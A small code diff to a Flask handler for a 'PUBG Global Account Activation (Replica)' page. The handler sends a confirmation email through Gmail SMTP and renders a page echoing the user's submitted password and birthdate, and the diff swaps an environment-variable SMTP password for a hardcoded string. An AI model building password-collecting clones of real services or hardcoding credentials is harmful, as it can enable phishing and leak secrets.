@@ -65,7 +65,7 @@ def post_information():
 
         msg = EmailMessage()
         msg['Subject'] = 'PUBG Global Account Activation (Replica)'
-        msg['From'] = "..m"
+        msg['From'] = ".."
         msg['To'] = email_receive
         msg.set_content('Confirmation please')
 
@@ -73,7 +73,7 @@ def post_information():
 
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
 
-            smtp.login("..", os.getenv('pswd1'))
+            smtp.login("..", "..")
             smtp.send_message(msg)
 
         return render_template("verification.html", email=email_receive, pswd= pswd_receive, user=user_receive, month=month_receive, day=day_receive, year=year_receive, d1=d1)
